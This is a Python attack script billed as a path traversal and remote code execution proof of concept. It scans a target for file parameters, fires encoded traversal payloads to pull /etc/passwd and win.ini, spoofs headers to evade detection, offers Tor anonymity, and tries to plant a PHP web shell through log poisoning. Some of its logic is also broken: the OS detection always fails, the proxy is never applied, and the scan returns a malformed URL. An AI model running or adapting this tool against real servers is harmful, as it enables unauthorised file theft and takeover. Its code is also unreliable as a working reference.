import requests
import argparse
import os
import base64
import threading
from urllib.parse import quote

# Define traversal payloads for different encoding techniques
traversal_payloads = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoding
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",  # Double URL encoding
    base64.b64encode(b"../../../../etc/passwd").decode(),  # Base64 encoding
    "..\\..\\..\\..\\windows\\win.ini"  # Windows-style traversal
]

# Common headers to evade detection
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Referer": "https://trusted-site.com"
}

# Proxy for anonymity (Modify for Tor)
PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

def exploit(target_url, file_path, output_dir):
    """Attempts to exploit path traversal vulnerability."""
    try:
        response = requests.get(f"{target_url}?file={quote(file_path)}", headers=HEADERS, timeout=5)

        if response.status_code == 200 and ("root:" in response.text or "for 16-bit app support" in response.text):
            print(f"[+] SUCCESS! Extracted file: {file_path}")

            # Save output to a file
            save_path = os.path.join(output_dir, os.path.basename(file_path))
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"[+] File saved: {save_path}")

        else:
            print(f"[-] Failed for: {file_path} (Status Code: {response.status_code})")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")

def detect_os(target_url):
    """Detects if the target is running Linux or Windows."""
    print("[*] Detecting target OS...")
    linux_check = exploit(target_url, "../../../../etc/passwd", "os_detect")
    windows_check = exploit(target_url, "..\\..\\..\\..\\windows\\win.ini", "os_detect")

    if linux_check:
        print("[+] Target is a Linux system.")
        return "Linux"
    elif windows_check:
        print("[+] Target is a Windows system.")
        return "Windows"
    else:
        print("[-] OS detection failed.")
        return None

def inject_web_shell(target_url):
    """Injects a simple PHP web shell for remote command execution."""
    shell_payload = "../../../../var/log/nginx/access.log"
    malicious_code = "<?php system($_GET['cmd']); ?>"
    
    requests.get(f"{target_url}?file={shell_payload}", data=malicious_code, headers=HEADERS)
    print(f"[+] Web shell injected! Access it via: {target_url}?cmd=whoami")

def scan_for_vulnerable_endpoints(target_url):
    """Scans the target for endpoints that might be vulnerable."""
    print("[*] Scanning for file-based parameters...")
    test_params = ["file", "path", "download", "doc", "img", "dir", "log"]

    for param in test_params:
        url = f"{target_url}?{param}=../../../../etc/passwd"
        response = requests.get(url, headers=HEADERS, timeout=5)
        if "root:" in response.text:
            print(f"[+] Vulnerable endpoint found: {url}")
            return url
    return None

def main():
    parser = argparse.ArgumentParser(description="Advanced Path Traversal & RCE Exploit PoC")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://victim.com/download)")
    parser.add_argument("-o", "--output", default="extracted_files", help="Directory to save extracted files")
    parser.add_argument("--proxy", action="store_true", help="Use Tor proxy for anonymity")
    parser.add_argument("--rce", action="store_true", help="Attempt to inject a web shell for RCE")
    args = parser.parse_args()

    target_url = args.url
    output_dir = args.output

    if args.proxy:
        print("[*] Using Tor proxy for anonymity...")
        global PROXY
        PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)

    # Scan for vulnerable endpoints
    vulnerable_url = scan_for_vulnerable_endpoints(target_url)
    if not vulnerable_url:
        print("[-] No vulnerable endpoint found. Exiting.")
        return
    else:
        target_url = vulnerable_url

    # Detect OS
    os_type = detect_os(target_url)

    # Run exploitation in multiple threads for efficiency
    threads = []
    for payload in traversal_payloads:
        t = threading.Thread(target=exploit, args=(target_url, payload, output_dir))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    # If RCE is enabled, attempt to inject a web shell
    if args.rce:
        inject_web_shell(target_url)

    print("[*] Exploit process completed.")

if __name__ == "__main__":
    main()
